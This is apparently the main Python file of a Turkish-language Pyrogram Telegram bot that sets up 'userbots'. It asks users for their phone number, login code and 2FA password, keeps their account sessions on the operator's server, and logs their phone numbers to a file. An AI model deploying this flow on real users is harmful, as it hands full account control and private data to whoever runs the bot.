# main.py
import os
import logging
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid, 
    PhoneCodeExpired, FloodWait
)
from config import API_ID, API_HASH, BOT_TOKEN, BOT_NAME
from shared import user_data, user_clients
from userbot import setup_userbot_handlers

# Hataları terminalde takip edebilmek için loglama
logging.basicConfig(level=logging.ERROR)

# Ana Panel Botu
bot = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- LOG TUTMA FONKSİYONU ---
def log_user_to_file(chat_id, phone, username):
    """Giriş yapan kullanıcıyı dosyaya kaydeder."""
    try:
        with open("kayitli_kullanicilar.txt", "a", encoding="utf-8") as f:
            f.write(f"ID: {chat_id} | Kullanıcı: @{username} | Tel: {phone}\n")
    except Exception as e:
        print(f"Log yazma hatası: {e}")

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    chat_id = message.chat.id
    
    # Başlangıçta oturum kontrolü
    session_file = f"session_{chat_id}.session"
    if os.path.exists(session_file):
        text = (
            f"<b>⚠️ Zaten aktif bir oturumunuz bulunuyor!</b>\n\n"
            "<code>UserBot'unuz şu an çalışıyor. Komutları sohbette kullanabilirsiniz.</code>"
        )
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Komut Rehberi", callback_data="show_commands")]])
        return await message.reply(text, reply_markup=buttons)

    welcome_text = (
        f"<b>🚀 {BOT_NAME} Kurulum Paneli</b>\n"
        "──────────────────────\n"
        "<code>Aşağıdaki butonu kullanarak UserBot kurulumunu başlatabilirsiniz.</code>"
    )
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ Kurulumu Başlat", callback_data="start_login")],
        [InlineKeyboardButton("📜 Komutlar Rehberi", callback_data="show_commands")]
    ])
    msg = await client.send_message(chat_id, welcome_text, reply_markup=buttons)
    user_data[chat_id] = {"main_msg_id": msg.id, "step": None}

@bot.on_callback_query()
async def callback_handler(client, callback_query):
    chat_id = callback_query.message.chat.id
    data = callback_query.data
    
    if chat_id not in user_data:
        user_data[chat_id] = {"main_msg_id": callback_query.message.id, "step": None}
        
    main_msg_id = user_data[chat_id]["main_msg_id"]
    session_file = f"session_{chat_id}.session"

    if data == "show_commands":
        cmd_text = (
            f"<b>📜 {BOT_NAME} Komutları</b>\n"
            "──────────────────────\n"
            "• <code>.help</code> - Komut rehberini sohbete yazar.\n"
            "• <code>.alive</code> - Bot durumunu gösterir.\n"
            "• <code>.gpt (soru)</code> - AI asistanı.\n"
            "• <code>.out</code> - Oturumu kapatır.\n"
            "──────────────────────\n"
            "🛡 <b>Süreli Medya Yakalayıcı Aktif!</b>"
        )
        await callback_query.edit_message_text(cmd_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri Dön", callback_data="back_to_main")]]))

    elif data == "back_to_main":
        user_data[chat_id]["step"] = None
        
        # GÜNCEL KISIM: Geri dönerken oturum kontrolü yapıyoruz
        if os.path.exists(session_file):
            text = (
                f"<b>⚠️ Zaten aktif bir oturumunuz bulunuyor!</b>\n\n"
                "<code>UserBot'unuz şu an çalışıyor. Komutları sohbette kullanabilirsiniz.</code>"
            )
            buttons = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Komut Rehberi", callback_data="show_commands")]])
            await callback_query.edit_message_text(text, reply_markup=buttons)
        else:
            welcome_text = (
                f"<b>🚀 {BOT_NAME} Kurulum Paneli</b>\n"
                "──────────────────────\n"
                "<code>Kurulumu başlatarak UserBot'u aktif edebilirsiniz.</code>"
            )
            buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ Kurulumu Başlat", callback_data="start_login")],
                [InlineKeyboardButton("📜 Komutlar Rehberi", callback_data="show_commands")]
            ])
            await callback_query.edit_message_text(welcome_text, reply_markup=buttons)

    elif data == "start_login":
        if os.path.exists(session_file):
            return await callback_query.answer(
                "⚠️ Zaten aktif bir oturumunuz var!\nYeniden kurmak için dosyayı silmelisiniz.", 
                show_alert=True
            )

        user_data[chat_id]["step"] = "phone"
        await callback_query.edit_message_text(
            "<b>📱 Numara Girişi</b>\n──────────────────────\n<code>Lütfen numaranızı yazın (+90...):</code>", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 İptal", callback_data="back_to_main")]])
        )

    elif data == "confirm_phone":
        phone = user_data[chat_id].get("phone")
        session_name = f"session_{chat_id}"
        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Telegram'a bağlanılıyor...</code>")
        
        if session_name in user_clients: del user_clients[session_name]
        user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)

        try:
            await user_clients[session_name].connect()
            code_info = await user_clients[session_name].send_code(phone)
            user_data[chat_id].update({"hash": code_info.phone_code_hash, "step": "code"})
            
            await client.edit_message_text(
                chat_id, main_msg_id, 
                f"<b>📩 Kod Gönderildi</b>\n──────────────────────\n<code>{phone} numarasına gelen kodu girin:</code>"
            )
        except Exception as e:
            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Geri Dön", callback_data="back_to_main")]]))

@bot.on_message(filters.text & filters.private)
async def login_logic(client, message):
    chat_id = message.chat.id
    if chat_id not in user_data or not user_data[chat_id].get("step"): return
    
    step = user_data[chat_id].get("step")
    main_msg_id = user_data[chat_id].get("main_msg_id")
    session_name = f"session_{chat_id}"
    
    try: await message.delete()
    except: pass

    if step == "phone":
        user_data[chat_id]["phone"] = message.text
        await client.edit_message_text(
            chat_id, main_msg_id, 
            f"<b>🤔 Numara Onayı</b>\n──────────────────────\n<code>{message.text}</code>\nDoğru mu?", 
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Evet", callback_data="confirm_phone")],
                [InlineKeyboardButton("❌ Hayır", callback_data="start_login")]
            ])
        )

    elif step == "code":
        clean_code = message.text.replace(" ", "")
        await client.edit_message_text(chat_id, main_msg_id, "<code>⏳ Doğrulanıyor...</code>")
        try:
            await user_clients[session_name].sign_in(user_data[chat_id]["phone"], user_data[chat_id]["hash"], clean_code)
            await finalize_login(client, chat_id, main_msg_id, session_name)
        except SessionPasswordNeeded:
            user_data[chat_id]["step"] = "password"
            await client.edit_message_text(chat_id, main_msg_id, "<b>🔐 2FA Gerekli</b>\n──────────────────────\n<code>Bulut şifrenizi girin:</code>")
        except Exception as e:
            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Hata: {str(e)}</code>")

    elif step == "password":
        try:
            await user_clients[session_name].check_password(message.text)
            await finalize_login(client, chat_id, main_msg_id, session_name)
        except Exception as e:
            await client.edit_message_text(chat_id, main_msg_id, f"<code>❌ Şifre Hatalı: {str(e)}</code>")

async def finalize_login(client, chat_id, main_msg_id, session_name):
    user_data[chat_id]["step"] = None
    if user_clients[session_name].is_connected:
        await user_clients[session_name].disconnect()
    
    user_clients[session_name] = Client(session_name, api_id=API_ID, api_hash=API_HASH)
    setup_userbot_handlers(user_clients[session_name])
    await user_clients[session_name].start()
    
    me = await user_clients[session_name].get_me()
    log_user_to_file(chat_id, user_data[chat_id].get("phone"), me.username or me.first_name)
    
    await client.edit_message_text(
        chat_id, main_msg_id, 
        f"<b>🎉 Kurulum Tamamlandı!</b>\n\n<code>Hesap: @{me.username or me.first_name}</code>"
    )
    await user_clients[session_name].send_message("me", f"✅ <b>{BOT_NAME} Aktif!</b>\nArtık kullanıma hazırım.")

if __name__ == "__main__":
    print(f"--- {BOT_NAME} BAŞLATILDI ---")
    bot.run()
                     
